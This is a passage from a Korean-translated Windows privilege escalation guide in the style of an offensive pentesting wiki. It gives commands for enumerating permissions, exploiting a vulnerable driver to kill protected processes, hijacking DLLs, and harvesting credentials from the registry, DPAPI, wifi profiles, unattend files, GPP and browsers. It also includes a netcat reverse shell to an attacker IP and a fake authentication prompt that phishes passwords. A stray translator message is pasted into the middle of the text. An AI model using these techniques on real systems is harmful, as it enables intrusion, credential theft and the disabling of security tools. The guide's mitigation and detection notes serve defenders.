Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

**다른 사용자에 의해 실행될 registry나 binary를 덮어쓸 수 있는지 확인하세요.**\
**읽어보세요** **다음 페이지**에서 흥미로운 **autoruns locations to escalate privileges**에 대해 더 알아보세요:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

가능한 **third party weird/vulnerable** drivers를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
드라이버가 임의의 커널 읽기/쓰기 프리미티브를 노출하면 (잘못 설계된 IOCTL 핸들러에서 흔함), 커널 메모리에서 직접 SYSTEM 토큰을 훔쳐 권한을 상승할 수 있습니다. 단계별 기법은 다음을 참조하세요:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### 디바이스 객체에서 FILE_DEVICE_SECURE_OPEN 누락을 악용하기 (LPE + EDR kill)

일부 서명된 서드파티 드라이버는 IoCreateDeviceSecure로 강력한 SDDL을 사용해 디바이스 객체를 생성하지만 DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하는 것을 잊습니다. 이 플래그가 없으면, 디바이스가 추가 구성 요소를 포함한 경로로 열릴 때 secure DACL이 적용되지 않아 권한 없는 사용자가 다음과 같은 네임스페이스 경로를 사용해 핸들을 얻을 수 있습니다:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

사용자가 디바이스를 열 수 있게 되면, 드라이버가 노출한 권한 있는 IOCTLs를 LPE 및 변조에 악용할 수 있습니다. 실제 사례에서 관찰된 예시 기능:
- 임의 프로세스에 대한 전체 접근 핸들 반환 (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- 제한 없는 원시 디스크 읽기/쓰기 (오프라인 변조, 부팅 시 지속성 트릭).
- Protected Process/Light (PP/PPL)을 포함한 임의 프로세스 종료, 커널을 통해 user land에서 AV/EDR 종료 허용.

최소 PoC 패턴 (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- 권한이 필요한 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료나 handle 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTLs를 제약하세요 (access masks, METHOD_*, 입력 검증) 및 직접적인 kernel privileges 대신 브로커형(brokered) 모델 사용을 고려하세요.

Detection ideas for defenders
- 의심스러운 디바이스 이름의 user-mode 오픈(예: (e.g., \\ .\\amsdk*)) 및 남용을 시사하는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft의 취약한 드라이버 차단 목록(HVCI/WDAC/Smart App Control)을 적용하고 자체 허용/차단 목록을 유지하세요.


## PATH DLL Hijacking

If you have **PATH에 포함된 폴더에 대한 쓰기 권한이 있는 경우** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts 파일

hosts 파일에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열린 포트

외부에서 **제한된 서비스**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 끄기, 끄기...)**

추가[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root user 권한을 얻으면 어떤 포트든 수신(listen)할 수 있습니다 (포트에서 `nc.exe`를 사용해 수신(listen)하려고 처음 시도할 때 GUI로 `nc`를 방화벽에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash을 root로 쉽게 시작하려면 `--default-user root`를 시도해 보세요.

다음 폴더에서 `WSL` 파일시스템을 탐색할 수 있습니다: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격증명을 저장하여 **Windows**가 **사용자를 자동으로 로그인시킬 수** 있게 합니다. 처음에는 사용자가 Facebook 자격증명, Twitter 자격증명, Gmail 자격증명 등을 저장해 브라우저를 통해 자동으로 로그인하는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인시킬 수 있는 자격증명을 저장합니다. 즉, 어떤 **Windows 애플리케이션이 리소스(서버나 웹사이트)에 접근하기 위해 자격증명이 필요할 경우** **이 Credential Manager를 활용**하고 제공된 자격증명을 사용하여 사용자가 매번 사용자명과 비밀번호를 입력하지 않아도 된다는 뜻입니다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한, 특정 리소스에 대한 자격증명을 사용할 수는 없을 것 같습니다. 따라서 애플리케이션이 vault를 사용하려면 기본 저장 vault에서 해당 리소스의 자격증명을 **Credential Manager와 통신하여 요청해야 합니다**.

시스템에 저장된 자격증명을 나열하려면 `cmdkey`를 사용하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예제는 SMB 공유를 통해 원격 바이너리를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 자격 증명으로 `runas` 사용.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
참고: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)**는 데이터를 위한 대칭 암호화 방법을 제공하며, 주로 Windows 운영체제에서 비대칭 개인 키의 대칭 암호화에 사용됩니다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 엔트로피에 크게 기여합니다.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. 시스템 암호화가 적용되는 경우에는 시스템의 도메인 인증 비밀을 사용합니다.

암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 의미합니다. **사용자의 개인 키를 보호하는 마스터 키와 동일 파일에 함께 위치한 DPAPI 키**는 일반적으로 64바이트의 랜덤 데이터로 구성됩니다. (이 디렉터리에 대한 접근은 제한되어 있어 CMD의 `dir` 명령으로 내용을 나열할 수 없지만 PowerShell에서는 나열할 수 있다는 점을 유의하세요.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인자 (`/pvk` 또는 `/rpc`)와 함께 **mimikatz module** `dpapi::masterkey`를 사용하여 이를 복호화할 수 있습니다.

마스터 비밀번호로 보호된 **자격 증명 파일**은 일반적으로 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
적절한 `/masterkey`를 사용하여 **mimikatz module** `dpapi::cred`로 복호화할 수 있습니다.\
루트 권한이 있는 경우 `sekurlsa::dpapi` 모듈로 **extract many DPAPI** **masterkeys** from **memory** 할 수 있습니다.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 **scripting** 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 방법으로 자주 사용됩니다. 이 자격 증명은 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 사용자와 동일한 컴퓨터에서만 복호화할 수 있습니다.

파일에 포함된 PS 자격 증명을 **decrypt**하려면 다음을 수행할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **모든 .rdg 파일을 복호화**하세요.\
메모리에서 많은 DPAPI masterkeys를 Mimikatz `sekurlsa::dpapi` 모듈로 **추출할 수 있습니다**

### Sticky Notes

많은 사용자가 Windows 워크스테이션에서 StickyNotes 앱을 사용해 **비밀번호를 저장**하거나 기타 정보를 보관하는데, 이것이 데이터베이스 파일이라는 사실을 모르는 경우가 많습니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 찾아보고 분석할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 Administrator 권한이 필요하고 High Integrity level에서 실행되어야 한다는 점에 유의하세요.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 있습니다.\
이 파일이 존재한다면 일부 **credentials**가 구성되어 있고 **복구**될 수 있습니다.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요.\
설치 프로그램은 **SYSTEM privileges로 실행되며**, 많은 것이 **DLL Sideloading (출처** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (자격 증명)

### Putty 자격 증명
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH private keys

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 것이 있는지 확인하세요:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로 안에서 항목을 찾았다면 대개 저장된 SSH key일 가능성이 높습니다. 그것은 암호화된 상태로 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)을(를) 사용하면 쉽게 복호화할 수 있습니다.\
이 기법에 대한 자세한 내용은 여기에서 확인하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

If `ssh-agent` service is not running and you want it to automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. 몇 개의 ssh 키를 생성하고 `ssh-add`로 추가한 다음 ssh로 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고 procmon은 비대칭 키 인증 과정에서 `dpapi.dll`의 사용을 확인하지 못했습니다.

### 방치된 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
또한 **metasploit**의 _post/windows/gather/enum_unattend_를 사용하여 이러한 파일을 검색할 수 있습니다.

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 찾아보세요.

### 캐시된 GPP Pasword

이전에는 Group Policy Preferences (GPP)를 통해 여러 머신에 커스텀 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 취약점이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장되는 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 이러한 GPP들 내의 비밀번호는 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화되어 있었고, 인증된 사용자라면 누구나 이를 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 할 수 있게 해주는 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 비어있지 않은 "cpassword" 필드를 포함한 로컬에 캐시된 GPP 파일을 스캔하는 함수가 개발되었습니다. 해당 파일을 찾으면, 함수는 비밀번호를 복호화하고 커스텀 PowerShell 객체를 반환합니다. 이 객체는 GPP 및 파일의 위치에 대한 세부 정보를 포함하여 이 보안 취약점을 식별하고 수정하는 데 도움을 줍니다.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

사용자가 알고 있을 것이라고 생각되면 항상 **사용자에게 자신의 credentials 또는 다른 사용자의 credentials조차 입력하도록 요청할 수 있습니다** (주의: 클라이언트에게 **credentials**를 직접 **요청하는 것**은 정말 **위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials을 포함할 수 있는 파일 이름**

과거에 **passwords**가 **clear-text** 또는 **Base64**로 포함되어 있던 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
파일들을 모두 검색하려면 파일 목록이나 각 파일의 내용을 제공해 주세요. 현재 src/windows-hardening/windows-local-privilege-escalation/README.md의 내용이 제공되어 있지 않습니다. 해당 파일(또는 검색할 파일들)의 내용을 붙여넣어 주시면 요청하신 대로 마크다운/HTML 구문을 유지하면서 한국어로 번역해 드리겠습니다.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 자격 증명

또한 RecycleBin을 확인하여 그 안에 자격 증명이 있는지 찾아야 합니다

To **비밀번호를 복구**하려면 여러 프로그램에 저장된 항목을 복구하기 위해 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명이 포함될 수 있는 다른 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

브라우저의 **Chrome 또는 Firefox** 비밀번호가 저장된 DB를 확인해야 합니다.  
또한 브라우저의 방문 기록, 북마크 및 즐겨찾기도 확인하세요. 일부 **비밀번호가** 거기에 저장되어 있을 수 있습니다.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 덮어쓰기**

**Component Object Model (COM)**는 서로 다른 언어로 작성된 소프트웨어 컴포넌트 간의 **상호 통신(intercommunication)**을 가능하게 하는 Windows 운영체제 내의 기술입니다. 각 COM 컴포넌트는 **class ID (CLSID)로 식별되며** 각 컴포넌트는 하나 이상의 인터페이스를 통해 기능을 노출하고, 인터페이스는 interface ID (IID)로 식별됩니다.

COM 클래스와 인터페이스는 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의되어 있습니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 를 병합하여 생성된 **HKEY\CLASSES\ROOT** 입니다.

이 레지스트리의 CLSID 항목 내부에는 **InProcServer32**라는 하위 레지스트리가 있으며, 여기에는 **기본 값**으로 DLL을 가리키는 값과 **ThreadingModel**이라는 값이 들어 있습니다. ThreadingModel은 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) 또는 **Neutral** (Thread Neutral) 일 수 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 DLL 중 어느 하나를 **덮어쓸 수 있다면**, 해당 DLL이 다른 사용자에 의해 실행될 경우 **권한 상승**을 할 수 있습니다.

공격자가 COM Hijacking을 영속성 메커니즘으로 사용하는 방법을 알아보려면 다음을 확인하세요:

{{#ref}}
com-hijacking.md
